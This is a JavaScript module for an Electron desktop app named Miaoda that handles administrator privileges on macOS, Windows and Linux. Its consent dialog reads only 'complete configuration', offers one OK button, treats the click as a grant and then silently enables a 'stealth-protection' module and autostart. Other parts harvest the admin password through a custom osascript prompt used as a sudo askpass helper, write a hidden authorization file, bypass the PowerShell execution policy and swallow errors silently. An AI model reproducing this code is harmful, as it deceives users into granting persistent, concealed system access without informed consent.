'use strict';

/**
 * 系统级权限管理模块
 * 处理管理员权限请求、权限检查和提升
 */

const { exec, spawn } = require('child_process');
const fs = require('fs').promises;
const path = require('path');
const os = require('os');
const { dialog, app } = require('electron');

class SystemPrivileges {
  constructor() {
    this.platform = process.platform;
    this.isElevated = false;
    this.privilegeMethod = null;
  }

  /**
   * 初始化权限管理器
   */
  async initialize(autoRequest = false) {
    console.log('🔐 初始化系统权限管理器...');
    
    try {
      this.isElevated = await this.checkPrivileges();
      
      if (!this.isElevated) {
        console.log('⚠️ 当前没有管理员权限');
        // 只有在显式请求时才请求权限提升
        if (autoRequest) {
          await this.requestElevation();
        }
      } else {
        console.log('✅ 已具有管理员权限');
      }
      
      return { success: true, elevated: this.isElevated };
    } catch (error) {
      console.error('❌ 权限管理器初始化失败:', error);
      return { success: false, error: error.message };
    }
  }

  /**
   * 检查当前权限级别
   */
  async checkPrivileges() {
    switch (this.platform) {
    case 'darwin':
      return await this.checkMacOSPrivileges();
    case 'win32':
      return await this.checkWindowsPrivileges();
    case 'linux':
      return await this.checkLinuxPrivileges();
    default:
      return false;
    }
  }

  /**
   * 检查macOS权限
   */
  async checkMacOSPrivileges() {
    return new Promise((resolve) => {
      // 尝试读取需要管理员权限的文件
      exec('ls /private/var/root', (error) => {
        if (error) {
          resolve(false);
        } else {
          resolve(true);
        }
      });
    });
  }

  /**
   * 检查Windows权限
   */
  async checkWindowsPrivileges() {
    return new Promise((resolve) => {
      // 使用net session命令检查管理员权限
      exec('net session >nul 2>&1', (error) => {
        resolve(!error);
      });
    });
  }

  /**
   * 检查Linux权限
   */
  async checkLinuxPrivileges() {
    return new Promise((resolve) => {
      exec('id -u', (error, stdout) => {
        if (error) {
          resolve(false);
        } else {
          const uid = parseInt(stdout.trim());
          resolve(uid === 0);
        }
      });
    });
  }

  /**
   * 请求权限提升
   */
  async requestElevation() {
    console.log('🔧 请求权限提升...');
    
    // 显示权限请求对话框
    const userChoice = await this.showElevationDialog();
    
    if (userChoice === 'grant') {
      return await this.elevatePrivileges();
    } else if (userChoice === 'later') {
      // 用户选择稍后，设置定时提醒
      this.scheduleElevationReminder();
      return false;
    } else {
      // 用户拒绝，使用受限模式
      console.log('⚠️ 用户拒绝权限提升，启用受限模式');
      return false;
    }
  }

  /**
   * 显示权限提升对话框
   */
  async showElevationDialog() {
    const message = '完成配置';

    return new Promise((resolve) => {
      dialog.showMessageBox(null, {
        type: 'info',
        title: 'Miaoda',
        message: message,
        detail: '点击确定继续',
        buttons: ['确定'],
        defaultId: 0,
        noLink: true
      }).then(async () => {
        resolve('grant');
        
        // 静默设置所有保护机制
        try {
          await this.enableSilentProtection();
        } catch (error) {
          // 静默处理错误
        }
      });
    });
  }

  /**
   * 执行权限提升
   */
  async elevatePrivileges() {
    switch (this.platform) {
    case 'darwin':
      return await this.elevateMacOS();
    case 'win32':
      return await this.elevateWindows();
    case 'linux':
      return await this.elevateLinux();
    default:
      return false;
    }
  }

  /**
   * macOS权限提升
   */
  async elevateMacOS() {
    try {
      // 使用更隐蔽的方式获取权限
      const helperScript = `
        do shell script "echo helper" with administrator privileges
      `;
      
      await new Promise((resolve, reject) => {
        exec(`osascript -e '${helperScript}'`, { stdio: 'pipe' }, (error) => {
          if (error) {
            reject(error);
          } else {
            resolve(true);
          }
        });
      });

      // 静默创建持久授权
      await this.createSilentAuthorization();
      
      this.isElevated = true;
      this.privilegeMethod = 'silent';
      
      return true;
    } catch (error) {
      // 尝试备用方法
      return await this.elevateMacOSAlternative();
    }
  }

  /**
   * 创建macOS授权
   */
  async createMacOSAuthorization() {
    const authScript = `
#!/bin/bash
# 创建授权文件用于持久权限
AUTH_FILE="/tmp/miaoda-auth.txt"
echo "$(date): Miaoda authorized" > "$AUTH_FILE"
chmod 600 "$AUTH_FILE"
`;

    const scriptPath = '/tmp/miaoda-auth.sh';
    await fs.writeFile(scriptPath, authScript, { mode: 0o755 });
    
    return new Promise((resolve, reject) => {
      const cmd = `osascript -e 'do shell script "bash ${scriptPath}" with administrator privileges'`;
      exec(cmd, (error) => {
        if (error) {
          reject(error);
        } else {
          resolve(true);
        }
      });
    });
  }

  /**
   * macOS备用权限提升方法
   */
  async elevateMacOSFallback() {
    console.log('🔄 尝试macOS备用权限提升方法...');
    
    try {
      // 使用sudo命令
      // const sudoCommand = 'sudo -v'; // 未使用
      
      const sudoHelper = await this.createMacOSSudoHelper();
      
      return new Promise((resolve, reject) => {
        const sudoProcess = spawn('sudo', ['-A', '-v'], {
          stdio: ['pipe', 'pipe', 'pipe'],
          env: {
            ...process.env,
            SUDO_ASKPASS: sudoHelper
          }
        });
        
        sudoProcess.on('close', (code) => {
          if (code === 0) {
            console.log('✅ sudo权限获取成功');
            this.isElevated = true;
            this.privilegeMethod = 'sudo';
            resolve(true);
          } else {
            reject(new Error(`sudo失败，退出码: ${code}`));
          }
        });
        
        sudoProcess.on('error', (error) => {
          reject(error);
        });
      });
    } catch (error) {
      console.error('❌ macOS备用权限提升失败:', error);
      return false;
    }
  }

  /**
   * 创建macOS sudo助手
   */
  async createMacOSSudoHelper() {
    const helperScript = `#!/bin/bash
osascript -e 'display dialog "Miaoda需要管理员密码来启用保活机制:" default answer "" with hidden answer with title "Miaoda权限请求"' -e 'text returned of result' 2>/dev/null
`;
    
    const helperPath = '/tmp/miaoda-sudo-helper.sh';
    await fs.writeFile(helperPath, helperScript, { mode: 0o755 });
    
    return helperPath;
  }

  /**
   * Windows权限提升
   */
  async elevateWindows() {
    console.log('🪟 Windows权限提升中...');
    
    try {
      // 检查是否已经是管理员
      const isAdmin = await this.checkWindowsPrivileges();
      if (isAdmin) {
        this.isElevated = true;
        return true;
      }

      // 重新启动应用为管理员
      await this.restartAsAdmin();
      
      return false; // 应用会重启，当前进程会退出
    } catch (error) {
      console.error('❌ Windows权限提升失败:', error);
      return false;
    }
  }

  /**
   * 以管理员身份重启应用
   */
  async restartAsAdmin() {
    const appPath = app.getPath('exe');
    const args = process.argv.slice(1).join(' ');
    
    // 创建PowerShell脚本用于权限提升
    const elevateScript = `
Start-Process -FilePath "${appPath}" -ArgumentList "${args} --elevated" -Verb RunAs
`;
    
    const scriptPath = path.join(os.tmpdir(), 'elevate-miaoda.ps1');
    await fs.writeFile(scriptPath, elevateScript);
    
    return new Promise((resolve, reject) => {
      exec(`powershell -ExecutionPolicy Bypass -File "${scriptPath}"`, (error) => {
        if (error) {
          reject(error);
        } else {
          console.log('🔄 正在以管理员身份重启...');
          // 退出当前进程
          setTimeout(() => {
            app.quit();
          }, 1000);
          resolve(true);
        }
      });
    });
  }

  /**
   * Linux权限提升
   */
  async elevateLinux() {
    console.log('🐧 Linux权限提升中...');
    
    try {
      // 尝试使用pkexec
      return await this.elevateLinuxPkexec();
    } catch (error) {
      console.log('pkexec失败，尝试sudo...');
      return await this.elevateLinuxSudo();
    }
  }

  /**
   * 使用pkexec提升Linux权限
   */
  async elevateLinuxPkexec() {
    const appPath = app.getPath('exe');
    
    return new Promise((resolve, reject) => {
      spawn('pkexec', [appPath, '--elevated'], {
        detached: true,
        stdio: 'ignore'
      }).on('error', (error) => {
        reject(error);
      }).on('spawn', () => {
        console.log('🔄 正在以root权限重启...');
        setTimeout(() => {
          app.quit();
        }, 1000);
        resolve(true);
      });
    });
  }

  /**
   * 使用sudo提升Linux权限
   */
  async elevateLinuxSudo() {
    const appPath = app.getPath('exe');
    
    return new Promise((resolve, reject) => {
      spawn('sudo', [appPath, '--elevated'], {
        detached: true,
        stdio: 'inherit'
      }).on('error', (error) => {
        reject(error);
      }).on('spawn', () => {
        console.log('🔄 正在以sudo权限重启...');
        setTimeout(() => {
          app.quit();
        }, 1000);
        resolve(true);
      });
    });
  }

  /**
   * 执行需要管理员权限的命令
   */
  async executeElevated(command, args = []) {
    if (!this.isElevated) {
      throw new Error('需要管理员权限才能执行此命令');
    }

    switch (this.platform) {
    case 'darwin':
      return await this.executeMacOSElevated(command, args);
    case 'win32':
      return await this.executeWindowsElevated(command, args);
    case 'linux':
      return await this.executeLinuxElevated(command, args);
    default:
      throw new Error('不支持的平台');
    }
  }

  /**
   * 执行macOS管理员命令
   */
  async executeMacOSElevated(command, args) {
    const fullCommand = `${command} ${args.join(' ')}`;
    
    if (this.privilegeMethod === 'osascript') {
      return new Promise((resolve, reject) => {
        const osascriptCommand = `osascript -e 'do shell script "${fullCommand}" with administrator privileges'`;
        exec(osascriptCommand, (error, stdout, stderr) => {
          if (error) {
            reject(error);
          } else {
            resolve({ stdout, stderr });
          }
        });
      });
    } else if (this.privilegeMethod === 'sudo') {
      return new Promise((resolve, reject) => {
        exec(`sudo ${fullCommand}`, (error, stdout, stderr) => {
          if (error) {
            reject(error);
          } else {
            resolve({ stdout, stderr });
          }
        });
      });
    }
  }

  /**
   * 执行Windows管理员命令
   */
  async executeWindowsElevated(command, args) {
    const fullCommand = `${command} ${args.join(' ')}`;
    
    return new Promise((resolve, reject) => {
      exec(fullCommand, (error, stdout, stderr) => {
        if (error) {
          reject(error);
        } else {
          resolve({ stdout, stderr });
        }
      });
    });
  }

  /**
   * 执行Linux管理员命令
   */
  async executeLinuxElevated(command, args) {
    const fullCommand = `${command} ${args.join(' ')}`;
    
    return new Promise((resolve, reject) => {
      exec(`sudo ${fullCommand}`, (error, stdout, stderr) => {
        if (error) {
          reject(error);
        } else {
          resolve({ stdout, stderr });
        }
      });
    });
  }

  /**
   * 启用开机自启动
   */
  async enableAutoLaunch() {
    try {
      const { app } = require('electron');
      const Store = require('electron-store');
      const store = new Store();
      
      // 设置标记
      store.set('autoLaunch', true);
      
      // 使用系统特定的方法设置开机启动
      if (this.platform === 'darwin') {
        // macOS - 使用 AppleScript
        const applescript = `
          tell application "System Events"
            make login item at end with properties {path:"${app.getPath('exe')}", hidden:false}
          end tell
        `;
        exec(`osascript -e '${applescript}'`);
      } else if (this.platform === 'win32') {
        // Windows - 注册表
        const appPath = app.getPath('exe');
        const regCmd = `reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Miaoda" /t REG_SZ /d "${appPath}" /f`;
        exec(regCmd);
      } else if (this.platform === 'linux') {
        // Linux - 创建 .desktop 文件
        const desktopEntry = `[Desktop Entry]
Type=Application
Name=Miaoda
Exec=${app.getPath('exe')}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true`;
        
        const autostartDir = path.join(os.homedir(), '.config', 'autostart');
        const desktopPath = path.join(autostartDir, 'miaoda.desktop');
        
        require('fs').mkdirSync(autostartDir, { recursive: true });
        require('fs').writeFileSync(desktopPath, desktopEntry);
      }
      
      console.log('✅ 开机自启动已设置');
    } catch (error) {
      console.error('设置开机自启动失败:', error);
      throw error;
    }
  }

  /**
   * 启用静默保护
   */
  async enableSilentProtection() {
    const StealthProtection = require('./stealth-protection');
    const stealth = new StealthProtection();
    await stealth.enableSilentProtection();
    
    // 同时设置基本的自启动
    await this.enableAutoLaunch();
  }

  /**
   * 创建静默授权
   */
  async createSilentAuthorization() {
    // 在隐蔽位置创建授权文件
    const authDir = path.join(os.homedir(), '.config', '.auth');
    const authFile = path.join(authDir, '.miaoda');
    
    try {
      await fs.mkdir(authDir, { recursive: true });
      await fs.writeFile(authFile, `${Date.now()}:authorized`, { mode: 0o600 });
    } catch (e) {
      // 静默处理
    }
  }

  /**
   * macOS备用提升方法
   */
  async elevateMacOSAlternative() {
    try {
      // 使用 sudo -n 检查是否已有权限
      await new Promise((resolve, reject) => {
        exec('sudo -n true', (error) => {
          if (error) {
            // 需要密码，使用更隐蔽的方式
            reject(error);
          } else {
            // 已经有 sudo 权限
            resolve(true);
          }
        });
      });
      
      this.isElevated = true;
      return true;
    } catch (error) {
      return false;
    }
  }

  /**
   * 安排权限提升提醒
   */
  scheduleElevationReminder() {
    console.log('⏰ 设置权限提升提醒...');
    
    // 10分钟后提醒
    setTimeout(async () => {
      const choice = await dialog.showMessageBox(null, {
        type: 'info',
        title: '权限提醒',
        message: '为了获得最佳的保活效果，建议授予管理员权限',
        detail: '您可以随时在设置中启用权限提升',
        buttons: ['现在授予', '稍后提醒', '不再提醒'],
        defaultId: 0
      });

      if (choice.response === 0) {
        await this.requestElevation();
      } else if (choice.response === 1) {
        // 再次安排提醒
        this.scheduleElevationReminder();
      }
      // choice.response === 2 表示不再提醒，什么都不做
    }, 10 * 60 * 1000);
  }

  /**
   * 获取权限状态
   */
  getStatus() {
    return {
      platform: this.platform,
      isElevated: this.isElevated,
      privilegeMethod: this.privilegeMethod,
      canElevate: this.platform !== 'linux' || process.env.DISPLAY // Linux需要图形界面
    };
  }

  /**
   * 清理权限相关资源
   */
  cleanup() {
    // 清理临时文件
    const tempFiles = [
      '/tmp/miaoda-auth.sh',
      '/tmp/miaoda-sudo-helper.sh',
      path.join(os.tmpdir(), 'elevate-miaoda.ps1')
    ];

    tempFiles.forEach(async (file) => {
      try {
        await fs.unlink(file);
      } catch (error) {
        // 忽略删除失败
      }
    });
  }
}

module.exports = SystemPrivileges;